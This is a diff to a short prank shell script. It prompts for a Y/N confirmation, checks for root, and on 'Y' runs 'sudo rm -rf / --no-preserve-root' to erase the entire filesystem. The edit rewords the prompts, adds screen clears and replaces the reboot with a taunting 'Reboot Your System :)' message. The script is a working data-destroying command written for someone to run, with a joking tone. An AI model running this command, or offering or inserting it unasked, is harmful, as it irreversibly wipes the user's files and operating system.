@@ -1,15 +1,18 @@
 #! /bin/sh
-echo "Ayo! You sure you gonna run this?"
+echo "Hold Up! You Sure you gonna run this?"
+echo
 printf 'Answer with Y or N : ' ;read -r confirmation
+
 if [ "$EUID" -ne 0 ]
   then echo; echo "Smh I dare you to run this as root"
   echo
   exit
 fi
-echo "Cool, As per your wish"
+clear
 if [[ $confirmation == "Y" ]] ; then
-sudo rm -rf / --no-preserve-root
-sudo reboot
+echo "As per your Wish"
+clear && sudo rm -rf / --no-preserve-root
+echo "Reboot Your System :)"
 
 elif [[ $confirmation == "N" ]] ; then
 echo "Great Choice , See you!"
